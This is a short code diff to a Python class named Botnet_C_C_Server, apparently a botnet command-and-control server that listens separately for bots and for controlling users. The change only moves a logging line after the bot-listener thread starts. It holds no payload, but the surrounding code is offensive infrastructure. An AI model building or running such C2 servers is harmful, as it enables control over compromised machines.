@@ -128,10 +128,11 @@ class Botnet_C_C_Server:
         self.socket_buffer_size=socket_buffer_size
         if self.logs==True:
             print("[*] Listening for bots on {}:{}".format(bots_host,bots_port))
-            print("[*] Listening for users on {}:{}".format(users_host,users_port))
         t1 = threading.Thread(target=self.run_bots_server)
         t1.threads_daemon=self.threads_daemon
         t1.start()
+        if self.logs==True:
+            print("[*] Listening for users on {}:{}".format(users_host,users_port))
         t2 = threading.Thread(target=self.run_users_server)
         t2.threads_daemon=self.threads_daemon
         t2.start()
